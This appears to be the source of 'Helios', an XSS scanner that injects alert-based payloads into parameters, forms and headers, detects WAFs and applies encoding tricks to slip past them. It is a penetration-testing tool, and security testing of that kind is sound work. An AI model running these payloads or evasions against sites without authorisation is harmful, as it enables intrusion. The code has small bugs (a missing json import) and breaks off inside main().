import argparse
import requests
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
import urllib.parse
import uuid
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import Select
from functools import wraps
import time
import threading
import shutil
import sys
import re
import random
import string
import warnings
import textwrap

warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)

def banner():
    print(f'''
    



                                                                                    
 {bcolors.FAIL}∞                                                                         π      ∞ 
   ∞                     ∞                                                      ∞   
     ∞                                       π                                ∞     
      ∞∞            ∞                 ∞                                     ∞∞      
        ∞∞                          ∞∞∞∞∞∞∞∞∞∞∞∞                          ∞∞        
          ∞∞                 ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞                  ∞∞          
            ∞π            ∞∞∞∞∞∞∞∞∞∞∞          ∞∞∞∞∞∞∞∞∞∞∞            ∞∞         ∞  
              ∞ π      ∞∞π∞∞∞∞∞       ∞     π   π    ∞∞∞∞∞π∞∞       ∞∞        π     
   π            ∞   ∞∞∞∞∞∞∞π         πππππ∞ππ ∞   π      ∞∞∞∞∞∞π   ∞                
                  ∞∞∞∞∞∞    ∞    π∞  ππ∞π∞π     ππ∞π        ∞∞∞∞∞∞                  
                ∞∞∞∞∞∞   ∞  ∞ππ ∞        ππ       ∞ ππ∞       ∞∞∞∞∞                 
               ∞∞∞∞∞ ∞∞   πππ∞ ∞      ∞∞∞∞∞∞∞∞∞π     ∞ ∞∞∞   ∞∞ ∞∞∞∞∞    ∞π  ∞      
             π∞∞∞∞    π∞∞π       ∞∞∞∞π∞∞∞∞∞∞∞∞ π∞∞π    π π∞∞∞    π∞∞∞∞        ∞     
            ∞∞∞∞∞      ∞π∞∞    ∞∞∞∞∞  π∞    ∞  ∞∞∞∞∞∞π  π∞∞∞π      ∞∞∞∞π            
           ∞∞∞∞∞  ∞  πππ   ∞∞∞∞∞∞  ∞ ∞ ∞π   ∞ ∞ ∞  ∞π∞∞∞∞π  ∞ ∞     ∞∞∞∞            
          ∞∞∞∞∞     ππ π  ∞ ∞∞∞ ∞∞  ∞π ∞πππ∞∞  ∞  ∞ π∞∞∞      ∞∞     ∞∞∞∞           
          ∞∞∞∞    π ∞ π   ∞∞∞∞∞∞∞ ∞∞ ∞∞ ∞π∞∞π∞∞ ∞∞ ∞∞∞∞∞∞π    π∞∞     ∞∞∞∞          
      π  ∞∞∞∞  π∞ π∞     ∞∞∞∞∞∞π ∞∞ ∞∞∞π∞∞∞∞∞ ∞∞ ∞∞ ∞∞∞ππ∞∞    ππ  π   ∞∞∞∞         
         ∞∞∞π    π∞     ∞  ∞∞∞∞∞∞∞∞ππ∞∞∞∞∞∞∞∞∞∞πππ∞∞∞∞∞∞∞∞∞∞  ∞  π     ∞∞∞∞         
        π∞∞∞      π     ∞∞∞∞     ∞∞π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞   ∞∞∞∞∞∞    ππ      ∞∞∞         
        ∞∞∞∞     π∞ ∞  ∞∞∞∞∞πππ∞∞∞π∞∞  {bcolors.BOLD}{bcolors.HEADER}HELIOS{bcolors.ENDC}{bcolors.FAIL}  ∞∞ ∞∞∞ππ∞∞∞π∞∞  π  ∞     ∞∞∞∞{bcolors.ENDC}        
 {bcolors.BOLD}∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ππ   ∞∞∞∞ ∞ππ∞∞{bcolors.BOLD}{bcolors.WARNING}v0.1{bcolors.ENDC}{bcolors.BOLD}ππππ∞π∞∞∞∞   ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞  
        ∞∞∞      ∞π    ∞∞∞∞πππππ∞∞ ∞∞∞∞∞∞∞∞π∞∞∞∞∞ ∞ππ∞∞∞∞∞∞∞∞   π ∞     π∞∞∞        
        ∞∞∞∞     ∞     π∞∞∞π∞∞∞∞∞∞  ππ∞∞∞∞π∞π∞π∞ ∞π∞∞∞∞∞∞∞∞∞∞     ∞     π∞∞∞        
        ∞∞∞∞     π     ∞∞∞∞∞   ∞∞∞∞∞ π∞∞∞∞∞ ∞∞π  ∞∞∞∞   ∞∞∞∞π π   ∞     ∞∞∞∞        
        ∞∞∞∞   π π∞     ∞∞∞∞∞∞∞  ∞∞ ∞ ∞∞∞π π∞∞ ∞∞∞∞ ∞∞∞∞∞∞∞π   π ∞π    ∞∞∞∞         
         ∞∞∞     ∞       ∞∞∞∞∞ ∞∞ ∞∞∞∞ π∞ ππ∞ π∞∞ ∞∞∞π∞∞∞∞∞     ∞∞ π   ∞∞∞∞         
         ∞∞∞∞  π   π      ∞ ∞∞∞ ∞∞∞ ∞ ∞∞∞π∞∞ ∞ ∞∞∞∞ ∞∞∞∞π∞     ππ∞     ∞∞∞          
          ∞∞∞∞  ∞   ∞      ∞∞∞∞∞π∞ ∞∞ ∞π∞∞∞∞π∞∞ ∞∞π ∞∞∞ππ   π  ππ     ∞∞∞∞          
           ∞∞∞∞    π∞∞π   ∞ ∞∞∞∞∞∞∞∞∞π∞ ∞π∞∞∞ ∞ ∞π∞∞∞∞∞∞   π  ∞∞     ∞∞∞∞           
         π  ∞∞∞∞   ∞ ∞ π  ∞    ∞∞∞∞∞∞∞ ∞∞∞∞∞∞ ∞∞∞∞∞π∞   ∞∞  ππ      ∞∞∞∞            
             ∞∞∞∞π     π∞ ∞       ∞∞∞∞∞∞π∞∞∞∞ ∞∞∞∞        ∞∞∞     ∞∞∞∞∞     ∞       
              ∞∞∞∞∞   ∞∞  ∞∞         ∞  ∞∞∞π  ∞         ∞π  π∞   ∞∞π∞∞              
                ∞∞∞∞∞π      π∞π   π      ∞π         ∞ππ ∞     π∞∞∞∞∞                
  ∞    π         π∞∞∞∞∞         π∞π  π∞  π   ∞∞π ∞ π         ∞∞∞∞∞                  
                ∞∞ π∞∞∞∞∞∞         ∞π    ππππ   ∞        π∞∞∞∞∞∞  ∞∞                
              ∞∞      ∞∞∞∞∞∞∞                         π∞∞∞∞∞∞∞      ∞∞              
            ∞∞           ∞∞∞π∞∞∞∞∞∞              ∞∞∞∞∞∞∞∞∞∞           ∞∞            
    π      ∞                π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞π∞∞∞∞∞∞π                ∞π          
         ∞         ∞∞             ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞              π         ∞π        
       ∞                                            π             ∞         ∞       
     ∞π π                                  ∞                        ∞         ∞     
   ∞π                                                                 π         ∞   
 ∞∞                                                                               ∞{bcolors.ENDC}
                                                                                    
                            {bcolors.BOLD}{bcolors.WARNING}Helios - Automated XSS Scanner{bcolors.ENDC}
                    {bcolors.BOLD}{bcolors.PURPLE}Author: {bcolors.ENDC}{bcolors.BOLD}@stuub   |   {bcolors.BOLD}{bcolors.PURPLE}Github: {bcolors.ENDC}{bcolors.BOLD}https://github.com/stuub


    ''')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    PARAM = '\033[96m'
    PURPLE = '\033[95m'

class TamperTechniques:
    @staticmethod
    def double_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def uppercase(payload):
        return ''.join(c.upper() if random.choice([True, False]) else c for c in payload)
    
    @staticmethod
    def hex_encode(payload):
        return ''.join(f'%{ord(c):02X}' for c in payload)
    
    @staticmethod
    def json_fuzz(payload):
        return json.dumps(payload)[1:-1]  # Remove quotes added by json.dumps
    
    @staticmethod
    def space_to_tab(payload):
        return payload.replace(' ', '\t')

def apply_tamper(payload, technique):
    if technique == 'doubleencode':
        return TamperTechniques.double_encode(payload)
    elif technique == 'uppercase':
        return TamperTechniques.uppercase(payload)
    elif technique == 'hexencode':
        return TamperTechniques.hex_encode(payload)
    elif technique == 'jsonfuzz':
        return TamperTechniques.json_fuzz(payload)
    elif technique == 'spacetab':
        return TamperTechniques.space_to_tab(payload)
    elif technique == 'all':
        tampered = payload
        for tech in ['doubleencode', 'uppercase', 'hexencode', 'jsonfuzz', 'spacetab']:
            tampered = apply_tamper(tampered, tech)
        return tampered
    else:
        return payload

class XSSScanner:
    def __init__(self, target_url, browser_type, headless, threads, custom_headers, cookies, output_file, payload_file, tamper):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update(custom_headers)
        self.session.cookies.update(cookies)
        self.verbose = False
        self.browser_type = browser_type
        self.headless = headless
        self.threads = threads
        self.output_file = output_file
        self.payload_file = payload_file
        self.lock = threading.Lock()  
        self.terminal_width = shutil.get_terminal_size().columns
        self.payload_identifiers = {}
        self.payloads = self.load_payloads()
        self.driver = self.setup_driver()
        self.skip_header_scan = False
        self.crawl = False
        self.crawl_depth = 2
        self.scanned_urls = set()
        self.discovered_urls = set()
        self.detected_wafs = []
        self.tamper = tamper
        self.canary_string = uuid.uuid4().hex[:8] 

    def cleanup(self):
        if hasattr(self, 'driver') and self.driver:
            self.driver.quit()
        sys.exit(0)

    def setup_driver(self):
        if self.browser_type == 'firefox':
            options = FirefoxOptions()
            if self.headless:
                options.add_argument("--headless")
            service = FirefoxService(GeckoDriverManager().install())
            driver = webdriver.Firefox(service=service, options=options)
        elif self.browser_type == 'chrome':
            options = ChromeOptions()
            if self.headless:
                options.add_argument("--headless")
            service = ChromeDriverManager().install()
            driver = webdriver.Chrome(options=options)
        else:
            self.print_and_save(f"[!] Unsupported browser type: {self.browser_type}", important=True)
            self.cleanup()

        driver.get(self.target_url)
        for name, value in self.session.cookies.items():
            driver.add_cookie({'name': name, 'value': value})

        return driver

    def load_payloads(self):
        if self.payload_file:
            try:
                with open(self.payload_file, 'r') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                self.print_and_save(f"[*] Loaded {len(payloads)} payloads from {self.payload_file}")
                self.extract_payload_identifiers(payloads)
                return payloads
            except Exception as e:
                self.print_and_save(f"[!] Error loading payload file: {str(e)}", important=True)
                return self.generate_default_payloads()
        else:
            return self.generate_default_payloads()
    
    def extract_payload_identifiers(self, payloads):
        for payload in payloads:
            alert_content = re.search(r"alert\(['\"](.+?)['\"]", payload)
            if alert_content:
                self.payload_identifiers[alert_content.group(1)] = payload
            else:
                identifier = uuid.uuid4().hex[:8]
                self.payload_identifiers[identifier] = payload
        self.print_and_save(f"[*] Extracted {len(self.payload_identifiers)} unique payload identifiers")

    def generate_default_payloads(self):
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
    
    def generate_random_param(self, length=8):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def customize_payload(self, payload):
        for identifier, original_payload in self.payload_identifiers.items():
            if payload == original_payload:
                unique_id = uuid.uuid4().hex[:8]
                if 'alert(' in payload:
                    customized = payload.replace('alert(', f'alert("{unique_id}"+')
                else:
                    customized = f"{payload}_{unique_id}"
                break
        else:
            customized = payload
        
        customized = customized.replace("alert('XSS')", "window.xss_test=true;alert('XSS')")

        if self.tamper:
            tampered = apply_tamper(customized, self.tamper)
            self.print_and_save(f"[*] Applied tamper technique '{self.tamper}': {tampered}")
            return tampered
        
        if 'alert(' in customized:
            customized = customized.replace("alert(", f"alert('{self.canary_string}'+")
        return customized

    def print_and_save(self, message, important=False):
        if self.verbose or important:
            with self.lock:
                message = self.color_parameters(message)
                lines = message.split('\n')
                for line in lines:
                    if important:
                        self.print_important(line)
                    else:
                        self.print_status(line)
                
                if self.output_file:
                    clean_message = self.remove_ansi_codes(message)
                    with open(self.output_file, 'a') as f:
                        f.write(clean_message + '\n')

    def color_parameters(self, message):
        return re.sub(r'(parameter:\s*)(\w+)', fr'\1{bcolors.PARAM}\2{bcolors.ENDC}', message)

    def remove_ansi_codes(self, message):
        return re.sub(r'\033\[[0-9;]*m', '', message)

    def print_status(self, message):
        self.terminal_width = shutil.get_terminal_size().columns
        if message.startswith('[*]'):
            colored_message = f"{bcolors.OKBLUE}[*]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[+]'):
            colored_message = f"{bcolors.OKGREEN}[+]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[!]'):
            colored_message = f"{bcolors.FAIL}[!]{bcolors.ENDC} {message[3:]}"
        else:
            colored_message = message

        wrapped_message = textwrap.fill(colored_message, self.terminal_width - 1)
        sys.stdout.write("\r" + " " * self.terminal_width + "\r")
        sys.stdout.write(wrapped_message + "\n")
        sys.stdout.flush()

    def print_important(self, message):
        self.terminal_width = shutil.get_terminal_size().columns
        if message.startswith('[*]'):
            colored_message = f"{bcolors.OKBLUE}[*]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[+]'):
            colored_message = f"{bcolors.OKGREEN}[+]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[!]'):
            colored_message = f"{bcolors.FAIL}[!]{bcolors.ENDC} {message[3:]}"
        else:
            colored_message = message

        wrapped_message = textwrap.fill(colored_message, self.terminal_width - 1)
        sys.stdout.write("\r" + " " * self.terminal_width + "\r")
        print(wrapped_message)
        sys.stdout.flush()

    def scan_url_parameters(self):
        parsed_url = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        for param, value in params.items():
            for payload in self.payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={urllib.parse.quote(payload)}")
                self.print_and_save(f"[*] Testing URL parameter: {param} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                if self.test_payload(payload, test_url, "GET"):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in URL parameter: {param}", important=True)

    def scan_dom_content(self):
        self.print_and_save("[*] Scanning for DOM-based XSS vulnerabilities")
        response = self.session.get(self.target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        scripts = soup.find_all('script')
        for script in scripts:
            if script.get('src'):
                script_url = urllib.parse.urljoin(self.target_url, script['src'])
                self.print_and_save(f"[*] Analyzing external script: {script_url}")
                script_content = self.fetch_external_script(script_url)
                if script_content:
                    self.test_dom_xss(script_content, is_external=True, script_url=script_url)
            elif script.string:
                self.test_dom_xss(script.string)

        for tag in soup.find_all(True):
            for attr in tag.attrs:
                if attr.lower().startswith('on'):
                    self.test_dom_xss(tag[attr])

    def fetch_external_script(self, url):
        try:
            response = self.session.get(url)
            return response.text
        except Exception as e:
            self.print_and_save(f"[!] Error fetching external script {url}: {str(e)}", important=True)
            return None

    def scan_headers(self):
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        for header in headers_to_test:
            for payload in self.payloads:
                self.print_and_save(f"[*] Testing header: {header} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                test_headers = {header: payload}
                if self.test_payload(payload, self.target_url, "GET", headers=test_headers):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in header: {header}", important=True)

    def scan_post_parameters(self):
        response = self.session.get(self.target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form_index, form in enumerate(forms):
            action = form.get('action', self.target_url)
            if not action.startswith(('http://', 'https://')):
                action = urllib.parse.urljoin(self.target_url, action)

            method = form.get('method', 'get').lower()
            if method != 'post':
                continue

            inputs = form.find_all('input')
            textareas = form.find_all('textarea')
            selects = form.find_all('select')

            params = {}
            for input_field in inputs + textareas + selects:
                name = input_field.get('name')
                if name:
                    params[name] = ''

            self.print_and_save(f"[*] Testing POST form {form_index + 1} with {len(params)} parameters")
            self.test_post_params(action, params)

    def test_post_params(self, url, params):
        for param in params:
            for payload in self.payloads:
                self.print_and_save(f"[*] Testing POST parameter: {param} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                test_params = params.copy()
                test_params[param] = payload
                if self.test_payload(payload, url, "POST", data=test_params):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in {bcolors.BOLD}POST{bcolors.ENDC} parameter: {param}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test Payload: {bcolors.OKGREEN}{payload}{bcolors.ENDC}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test URL: {bcolors.OKGREEN}{url}{bcolors.ENDC}", important=True),
                    self.print_and_save(f"{bcolors.BOLD}Test Parameter: {bcolors.OKGREEN}{param}{bcolors.ENDC}", important=True)
    
    def generate_default_value(self, field_type):
        if field_type == 'email':
            return 'test@example.com'
        elif field_type == 'number':
            return '123'
        elif field_type == 'tel':
            return '1234567890'
        elif field_type == 'password':
            return 'Password123!'
        else:
            return 'Test Input'

    def test_dom_xss(self, content, is_external=False, script_url=None):
        sources = [
            "document.URL", "document.documentURI", "document.URLUnencoded", "document.baseURI",
            "location", "document.cookie", "document.referrer", "window.name",
            "history.pushState", "history.replaceState", "localStorage", "sessionStorage",
            "IndexedDB", "WebSQL", "FileSystem"
        ]
        sinks = [
            "eval", "setTimeout", "setInterval", "setImmediate", "execScript",
            "crypto.generateCRMFRequest", "ScriptElement.src", "ScriptElement.text",
            "ScriptElement.textContent", "ScriptElement.innerText",
            "anyTag.onEventName", "range.createContextualFragment",
            "crypto.generateCRMFRequest", "HTMLElement.innerHTML",
            "Document.write", "Document.writeln"
        ]

        for source in sources:
            for sink in sinks:
                pattern = re.compile(r'{}.*?{}'.format(re.escape(source), re.escape(sink)), re.IGNORECASE | re.DOTALL)
                if pattern.search(content):
                    location = "an external script" if is_external else "an inline script"
                    self.print_and_save(f"[+] Potential DOM XSS found in {location}: {bcolors.OKGREEN}{source} flowing into {sink}", important=True)
                    if is_external:
                        self.print_and_save(f"Script URL: {script_url}")
                    
                    exploit_info = self.confirm_dom_xss(source, sink, is_external, script_url)
                    if exploit_info:
                        self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {bcolors.OKGREEN}{source} {bcolors.ENDC}into {bcolors.OKGREEN}{sink}{bcolors.ENDC}", important=True)
                        self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
                        return True

        vulnerable_patterns = [
            (r'document\.write\s*\(\s*.*\)', "document.write"),
            (r'\.innerHTML\s*=\s*.*', "innerHTML"),
            (r'\.outerHTML\s*=\s*.*', "outerHTML"),
            (r'\.insertAdjacentHTML\s*\(.*\)', "insertAdjacentHTML"),
            (r'execScript\s*\(.*\)', "execScript"),
            (r'setTimeout\s*\(.*\)', "setTimeout"),
            (r'setInterval\s*\(.*\)', "setInterval"),
        ]

        for pattern, func_name in vulnerable_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                location = "an external script" if is_external else "an inline script"
                self.print_and_save(f"[+] Potential DOM XSS vulnerability found in {location}: {bcolors.OKGREEN}{func_name}{bcolors.ENDC}", important=True)
                if is_external:
                    self.print_and_save(f"Script URL: {script_url}")
                
                exploit_info = self.confirm_dom_xss(func_name, func_name, is_external, script_url)
                if exploit_info:
                    self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {func_name}", important=True)
                    self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
                    return True

        return False
    
    def confirm_dom_xss(self, source, sink, is_external=False, script_url=None):
        parsed_url = urllib.parse.urlparse(self.target_url)
        query = parsed_url.query
        
        if '=' not in query and query:
            original_param = query
            existing_params = {}
        else:
            existing_params = urllib.parse.parse_qs(query)
            original_param = None
        
        for payload in self.payloads:
            encoded_payload = urllib.parse.quote(payload)
            
            if original_param:
                test_query = f"{original_param}{encoded_payload}"
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                
                self.print_and_save(f"[*] Testing DOM XSS URL: {test_url}", important=True)
                
                if self.test_single_payload(test_url, payload):
                    return self.generate_exploit_info(source, sink, payload, test_url, is_external, script_url)
            
            for param, values in existing_params.items():
                test_params = existing_params.copy()
                test_params[param] = [f"{values[0]}{encoded_payload}"]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                if original_param:
                    test_query = f"{original_param}&{test_query}"
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                
                self.print_and_save(f"[*] Testing DOM XSS URL: {test_url}", important=True)
                
                if self.test_single_payload(test_url, payload):
                    return self.generate_exploit_info(source, sink, payload, test_url, is_external, script_url)
            
            new_param_names = ['input', 'data', 'value', 'param', self.generate_random_param()]
            for new_param in new_param_names:
                test_params = existing_params.copy()
                test_params[new_param] = [encoded_payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                if original_param:
                    test_query = f"{original_param}&{test_query}"
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                
                self.print_and_save(f"[*] Testing DOM XSS URL with new parameter '{new_param}': {test_url}", important=True)
                
                if self.test_single_payload(test_url, payload):
                    return self.generate_exploit_info(source, sink, payload, test_url, is_external, script_url)

        return None
    
    def test_single_payload(self, test_url, payload):
        self.driver.get(test_url)
        return self.check_exploitation(payload)

    def generate_exploit_info(self, source, sink, payload, exploit_url, is_external, script_url):
        exploit_info = f"{bcolors.BOLD}{bcolors.OKGREEN}Vulnerable Source: {source}{bcolors.ENDC}\n"
        exploit_info += f"{bcolors.BOLD}{bcolors.OKGREEN}Vulnerable Sink: {sink}{bcolors.ENDC}\n"
        exploit_info += f"{bcolors.BOLD}{bcolors.OKGREEN}Payload: {payload}{bcolors.ENDC}\n"
        exploit_info += f"{bcolors.BOLD}{bcolors.OKGREEN}Exploit URL: {exploit_url}{bcolors.ENDC}\n"
        
        if is_external:
            exploit_info += f"{bcolors.WARNING}Vulnerable External Script: {script_url}\n"
        
        return exploit_info
    
    def run_scan(self):
        self.print_and_save(f"[*] Starting XSS scan on {self.target_url}")
        start_time = time.time()

        detected_wafs = self.detect_waf()
        if detected_wafs:
            self.print_and_save(f"[!] WAF detected: {', '.join(detected_wafs)}", important=True)
            self.print_and_save("[!] WAF presence may affect scan results or require evasion techniques.", important=True)
        else:
            self.print_and_save("[*] No WAF detected.")

        if self.crawl:
            self.crawl_website(self.target_url, self.crawl_depth)
            self.print_and_save(f"[*] Crawling complete. Discovered {len(self.discovered_urls)} URLs.")
        else:
            self.discovered_urls.add(self.target_url)

        for url in self.discovered_urls:
            self.print_and_save(f"[*] Scanning URL: {url}")
            self.scan_single_url(url)

        end_time = time.time()
        self.print_and_save(f"[+] Scan complete. Time taken: {end_time - start_time:.2f} seconds", important=True)
        
        if self.output_file:
            self.print_and_save(f"[+] Results saved to {self.output_file}", important=True)
        
        self.cleanup()

    def detect_waf(self):
        waf_signatures = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status'],
            'Akamai': ['akamai-gtm', 'ak_bmsc'],
            'Incapsula': ['incap_ses', 'visid_incap'],
            'Sucuri': ['sucuri-clientside'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'F5 BIG-IP': ['BIGipServer'],
            'Barracuda': ['barra_counter_session'],
            'Citrix NetScaler': ['ns_af=', 'citrix_ns_id'],
            'Amazon WAF': ['x-amz-cf-id', 'x-amzn-RequestId'],
            'Wordfence': ['wordfence_verifiedHuman']
        }

        response = self.session.get(self.target_url)
        headers = response.headers
        cookies = response.cookies

        detected_wafs = []

        for waf, signatures in waf_signatures.items():
            for signature in signatures:
                if signature.lower() in [header.lower() for header in headers] or signature in cookies:
                    detected_wafs.append(waf)
                    break

        return detected_wafs

    def handle_alerts(func):
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            try:
                return func(self, *args, **kwargs)
            except Exception as e:
                if "UnexpectedAlertPresentException" in str(e) or "UnexpectedAlertOpenError" in str(e):
                    try:
                        alert = self.driver.switch_to.alert
                        alert_text = alert.text
                        self.print_and_save(f"[+] Alert detected: {alert_text}")
                        if self.canary_string in alert_text:
                            self.print_and_save(f"[+] XSS confirmed! Canary string found in alert: {self.canary_string}")
                            return True
                        alert.accept()
                        return None
                    except:
                        pass
                raise
        return wrapper

    @handle_alerts
    def find_and_click_submit(self):
        for _ in range(3):
            try:
                submit_button = WebDriverWait(self.driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, "//input[@type='submit'] | //button[@type='submit']"))
                )
                self.print_and_save("[*] Found submit button, clicking...")
                submit_button.click()
                return True
            except Exception as e:
                if "StaleElementReferenceException" in str(e):
                    self.print_and_save("[!] Stale element, refreshing page and retrying...")
                    self.driver.refresh()
                else:
                    self.print_and_save(f"[!] Error clicking submit button: {str(e)}")
                    return False
        
        self.print_and_save("[!] Failed to click submit button after multiple attempts")
        return False

    @handle_alerts
    def check_exploitation(self, payload):
        alert_detected = False
        try:
            WebDriverWait(self.driver, 5).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            self.print_and_save(f"[+] {bcolors.BOLD}Alert detected with text: {bcolors.OKGREEN}{alert_text}{bcolors.ENDC}")
            if self.canary_string in alert_text:
                self.print_and_save(f"[+] XSS confirmed! Canary string found in alert: {self.canary_string}")
                alert_detected = True
            alert.accept()
        except TimeoutException:
            self.print_and_save(f"{bcolors.FAIL}[-]{bcolors.ENDC}  No alert detected")

        page_source = self.driver.page_source
        if payload in page_source:
            self.print_and_save("[+] Payload found in page source")
            return "Payload reflected" + (" and executed" if alert_detected else " but not executed")

        try:
            xss_test = self.driver.execute_script("return window.xss_test;")
            if xss_test:
                self.print_and_save("[+] Script execution confirmed via xss_test variable")
                return "Script executed without alert"
        except Exception as e:
            self.print_and_save(f"[-] Error checking script execution: {str(e)}")

        return "XSS Confirmed" if alert_detected else None
    
    @handle_alerts
    def test_payload(self, payload, url, method, headers=None, data=None):
        original_payload = payload
        payload = self.customize_payload(payload)
        self.print_and_save(f"[*] Testing payload: {original_payload}", important=True)
        self.print_and_save(f"[*] Customized payload: {payload}", important=True)
        
        try:
            if method == "GET":
                self.print_and_save(f"[*] Sending GET request to: {url.replace(original_payload, payload)}")
                self.driver.get(url.replace(original_payload, payload))
            elif method == "POST":
                self.print_and_save(f"[*] Sending POST request to: {url}")
                self.driver.get(url)
                
                for field in self.driver.find_elements(By.XPATH, "//input | //textarea | //select"):
                    field_name = field.get_attribute('name')
                    field_type = field.get_attribute('type')
                    
                    if field_name in data:
                        try:
                            if field_type == 'submit':
                                continue
                            elif field_type in ['checkbox', 'radio']:
                                if data[field_name].lower() == 'true':
                                    if not field.type():
                                        field.click()
                                    elif field_type in ['checkbox', 'radio']:
                                        if data[field_name].lower() == 'true':
                                            if not field.is_selected():
                                                field.click()
                            elif field.tag_name == 'select':
                                Select(field).select_by_value(data[field_name].replace(original_payload, payload))
                            else:
                                field.clear()
                                field.send_keys(data[field_name].replace(original_payload, payload))
                            
                            self.print_and_save(f"[*] Filled form field '{field_name}' with value: {data[field_name].replace(original_payload, payload)}")
                        except Exception as e:
                            self.print_and_save(f"[!] Could not fill input field: {field_name}. Error: {str(e)}", important=True)

            if not self.find_and_click_submit():
                self.print_and_save("[!] Could not submit the form, but continuing to check for XSS")

            self.print_and_save("[*] Request sent, checking for exploitation...")
            exploitation_result = self.check_exploitation(payload)
            
            if exploitation_result is True:  # Direct result from handle_alerts decorator
                self.print_and_save(f"[+] XSS vulnerability confirmed with payload: {bcolors.WARNING}{original_payload}{bcolors.ENDC}", important=True)
                self.print_and_save(f"[+] Exploitation details: Alert with canary string detected", important=True)
                return True
            elif exploitation_result:
                self.print_and_save(f"[+] XSS vulnerability confirmed with payload: {bcolors.WARNING}{original_payload}{bcolors.ENDC}", important=True)
                self.print_and_save(f"[+] Exploitation details: {exploitation_result}", important=True)
                return True
            else:
                self.print_and_save(f"[-] No XSS vulnerability detected with payload: {original_payload}")
                return False

        except Exception as e:
            self.print_and_save(f"[!] Error testing payload: {str(e)}", important=True)
        return False

    def scan_single_url(self, url):
        self.target_url = url
        self.print_and_save(f"[*] Testing URL parameters for: {url}")
        
        if self.detected_wafs:
            self.print_and_save("[!] WAF detected. Some tests may be blocked or produce false negatives.", important=True)
        
        self.scan_url_parameters()
        
        self.print_and_save(f"[*] Scanning DOM content for: {url}")
        self.scan_dom_content()

        self.print_and_save(f"[*] Testing POST parameters for: {url}")
        self.scan_post_parameters()

        if not self.skip_header_scan:
            self.print_and_save(f"[*] Testing headers for: {url}")
            self.scan_headers()

    def crawl_website(self, url, depth):
        if depth == 0 or url in self.scanned_urls:
            return

        self.scanned_urls.add(url)
        self.discovered_urls.add(url)
        self.print_and_save(f"[*] Crawling: {url}")

        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            if soup is None:
                return
            
            for link in soup.find_all('a', href=True):
                next_url = urllib.parse.urljoin(url, link['href'])
                parsed_next_url = urllib.parse.urlparse(next_url)
                parsed_target_url = urllib.parse.urlparse(self.target_url)
                
                if (parsed_next_url.netloc == parsed_target_url.netloc and 
                    parsed_next_url.scheme == parsed_target_url.scheme):
                    self.crawl_website(next_url, depth - 1)
        except Exception as e:
            self.print_and_save(f"[!] Error crawling {url}: {str(e)}", important=True)

def main():
    parser = argparse.ArgumentParser(description="Helios - Automated XSS Scanner")
    parser.add_argument("target", nargs='?', help="Target URL to scan")
    parser.add_argument("-l", "--target-list", help="File containing list of target URLs")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--browser", choices=['firefox', 'chrome'], default='firefox', help="Choose browser driver (default: firefox)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 4)")
